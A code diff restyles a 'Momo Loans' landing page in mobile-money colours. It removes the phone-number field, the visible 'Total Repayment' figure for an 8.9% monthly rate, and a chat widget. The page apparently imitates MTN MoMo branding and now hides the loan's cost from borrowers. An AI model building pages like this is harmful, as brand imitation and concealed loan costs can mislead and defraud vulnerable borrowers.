@@ -3,22 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="theme-color" content="#1e2b5e">
+    <meta name="theme-color" content="#005377">
     <title>Momo Loans | Instant Cash into Your Mobile Wallet</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --blue: #1e2b5e;
-            --blue-light: #2a3a7a;
-            --red: #e30613;
+            --momo-blue: #005377;
+            --momo-teal: #007ea7;
+            --momo-dark: #003a54;
+            --momo-yellow: #ffcc00;
             --green: #00a651;
             --white: #ffffff;
-            --gray-light: #f8fafc;
-            --gray-border: #e2e8f0;
-            --text-dark: #1e293b;
-            --text-muted: #64748b;
-            --shadow: 0 10px 25px -5px rgba(30, 43, 94, 0.15), 0 8px 10px -6px rgba(30, 43, 94, 0.1);
+            --gray-light: #f4f8fa;
+            --gray-border: #d0dce8;
+            --text-dark: #1a2b33;
+            --text-muted: #6b7f8a;
+            --shadow: 0 10px 25px -5px rgba(0, 83, 119, 0.15), 0 8px 10px -6px rgba(0, 83, 119, 0.1);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
@@ -37,9 +38,9 @@
             box-shadow: 0 1px 3px rgba(0,0,0,0.05);
         }
 
-        .logo { font-family: 'Poppins', sans-serif; font-size: 24px; font-weight: 900; text-decoration: none; }
-        .logo .momo { color: var(--blue); }
-        .logo .loans { color: var(--red); }
+        .logo { font-family: 'Poppins', sans-serif; font-size: 24px; font-weight: 800; text-decoration: none; display: flex; align-items: center; }
+        .logo .momo { color: var(--momo-blue); }
+        .logo .loans { color: var(--momo-yellow); background: var(--momo-blue); padding: 2px 6px; border-radius: 4px; margin-left: 4px; font-size: 20px;}
 
         .hero {
             padding: 4rem 5%;
@@ -56,7 +57,7 @@
             font-size: 3.5rem;
             font-weight: 800;
             line-height: 1.1;
-            color: var(--blue);
+            color: var(--momo-blue);
             margin-bottom: 1.5rem;
         }
 
@@ -102,6 +103,7 @@
             font-weight: 700;
             margin-bottom: 0.5rem;
             text-align: center;
+            color: var(--momo-blue);
         }
 
         .calc-subtitle {
@@ -131,7 +133,7 @@
         .value-display {
             font-weight: 800;
             font-size: 1.25rem;
-            color: var(--blue);
+            color: var(--momo-blue);
         }
 
         /* Range Slider Styling */
@@ -149,7 +151,7 @@
             -webkit-appearance: none;
             width: 28px;
             height: 28px;
-            background: var(--blue);
+            background: var(--momo-blue);
             border-radius: 50%;
             cursor: pointer;
             border: 4px solid var(--white);
@@ -164,66 +166,9 @@
             color: var(--text-muted);
         }
 
-        /* Phone Input */
-        .phone-field {
-            background: var(--gray-light);
-            border: 2px solid var(--gray-border);
-            border-radius: 12px;
-            padding: 0.75rem 1rem;
-            display: flex;
-            align-items: center;
-            margin-bottom: 2rem;
-            transition: border-color 0.2s;
-        }
-
-        .phone-field:focus-within {
-            border-color: var(--blue);
-        }
-
-        .phone-prefix {
-            font-weight: 700;
-            color: var(--blue);
-            margin-right: 0.75rem;
-            border-right: 2px solid var(--gray-border);
-            padding-right: 0.75rem;
-        }
-
-        .phone-input {
-            flex: 1;
-            border: none;
-            background: transparent;
-            font-size: 1rem;
-            font-weight: 700;
-            outline: none;
-            font-family: inherit;
-        }
-
-        /* Result Box */
-        .result-box {
-            background: var(--blue);
-            color: var(--white);
-            border-radius: 16px;
-            padding: 1.5rem;
-            margin-bottom: 1.5rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .result-label {
-            font-size: 0.875rem;
-            font-weight: 600;
-            opacity: 0.9;
-        }
-
-        .result-value {
-            font-size: 1.75rem;
-            font-weight: 800;
-        }
-
         .apply-btn {
             width: 100%;
-            background: var(--red);
+            background: var(--momo-blue);
             color: var(--white);
             border: none;
             padding: 1.25rem;
@@ -234,11 +179,12 @@
             transition: transform 0.2s, background 0.2s;
             text-transform: uppercase;
             letter-spacing: 0.5px;
-            box-shadow: 0 4px 14px rgba(227, 6, 19, 0.3);
+            box-shadow: 0 4px 14px rgba(0, 83, 119, 0.3);
+            margin-top: 1.5rem;
         }
 
         .apply-btn:hover {
-            background: #c20510;
+            background: var(--momo-teal);
             transform: translateY(-2px);
         }
 
@@ -258,7 +204,7 @@
             font-size: 2.25rem;
             font-weight: 800;
             margin-bottom: 4rem;
-            color: var(--blue);
+            color: var(--momo-blue);
         }
 
         .benefits-grid {
@@ -284,7 +230,7 @@
             justify-content: center;
             margin: 0 auto 1.5rem;
             font-size: 2rem;
-            color: var(--blue);
+            color: var(--momo-blue);
         }
 
         .benefit-card h3 {
@@ -316,6 +262,7 @@
         @media (max-width: 480px) {
             header { padding: 0.85rem 5%; }
             .logo { font-size: 20px; }
+            .logo .loans { font-size: 16px; }
 
             .hero { padding: 2rem 5%; gap: 2rem; }
             .hero-content h1 { font-size: 1.85rem; margin-bottom: 1rem; }
@@ -329,10 +276,7 @@
             .calc-subtitle { margin-bottom: 1.5rem; }
 
             .value-display { font-size: 1.1rem; }
-            .result-value { font-size: 1.4rem; }
-            .result-box { padding: 1.25rem; }
-
-            .apply-btn { padding: 1rem; font-size: 1rem; }
+            .apply-btn { padding: 1rem; font-size: 1rem; margin-top: 1rem; }
 
             .benefits { padding: 3rem 5%; }
             .section-title { font-size: 1.6rem; margin-bottom: 2.5rem; }
@@ -387,20 +331,7 @@
                     </div>
                 </div>
 
-                <div class="label-row" style="margin-top: 2rem;">
-                    <label>MTN MoMo Number</label>
-                </div>
-                <div class="phone-field">
-                    <span class="phone-prefix">+260</span>
-                    <input type="tel" id="phone-input" class="phone-input" placeholder="9XXXXXXXX" maxlength="9">
-                </div>
-
-                <div class="result-box">
-                    <span class="result-label">Total Repayment</span>
-                    <span class="result-value" id="total-val">K3,167.50</span>
-                </div>
-
-                <button class="apply-btn" id="apply-btn">Get My Cash Now</button>
+                <button class="apply-btn" id="apply-btn">Next</button>
             </div>
         </div>
     </section>
@@ -429,10 +360,8 @@
     <script>
         const amountSlider = document.getElementById('amount-slider');
         const termSlider = document.getElementById('term-slider');
-        const phoneInput = document.getElementById('phone-input');
         const amountVal = document.getElementById('amount-val');
         const termVal = document.getElementById('term-val');
-        const totalVal = document.getElementById('total-val');
         const applyBtn = document.getElementById('apply-btn');
 
         const MONTHLY_INTEREST = 0.089; // 8.9% monthly
@@ -441,32 +370,14 @@
             const amount = parseInt(amountSlider.value);
             const term = parseInt(termSlider.value);
             
-            // Calculation: Principal + (Principal * 8.9% * Months)
-            const totalInterest = amount * MONTHLY_INTEREST * term;
-            const totalRepayment = amount + totalInterest;
-
             amountVal.textContent = 'K' + amount.toLocaleString();
             termVal.textContent = term + (term === 1 ? ' Month' : ' Months');
-            totalVal.textContent = 'K' + totalRepayment.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
         }
-
-        // Phone input validation: Only digits, max 9 digits (Zambian mobile numbers)
-        phoneInput.addEventListener('input', function(e) {
-            let v = this.value.replace(/\D/g, '');
-            this.value = v.substring(0, 9);
-        });
 
         amountSlider.addEventListener('input', updateCalc);
         termSlider.addEventListener('input', updateCalc);
 
         applyBtn.addEventListener('click', function() {
-            const phone = phoneInput.value;
-            if (phone.length !== 9) {
-                alert('Please enter a valid 9-digit MTN MoMo number');
-                phoneInput.focus();
-                return;
-            }
-
             this.disabled = true;
             this.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
             
@@ -474,25 +385,12 @@
             const total = (parseInt(amountSlider.value) + (parseInt(amountSlider.value) * MONTHLY_INTEREST * parseInt(termSlider.value))).toFixed(2);
 
             setTimeout(() => {
-                window.location.href = `apply.html?phone=${phone}&data=${encodeURIComponent(term)}&price=${total}`;
+                window.location.href = `apply.html?data=${encodeURIComponent(term)}&price=${total}`;
             }, 1200);
         });
 
         // Initial calculation
         updateCalc();
     </script>
-    <!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/6aabfda6fe67d9344710050e/default';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<!--End of Tawk.to Script-->
 </body>
-  </html>
+</html>
